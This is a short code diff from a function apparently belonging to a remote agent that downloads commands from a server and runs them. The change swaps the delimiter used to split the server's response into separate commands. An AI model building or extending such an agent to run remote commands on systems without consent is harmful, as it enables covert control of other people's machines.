@@ -251,7 +251,7 @@ def download_and_run_commands():
 
         if req.status == 200:
             results = []
-            agent_commands = response.split(';')
+            agent_commands = response.split('++')
 
             for i, command in enumerate(agent_commands):
                 if command is '':
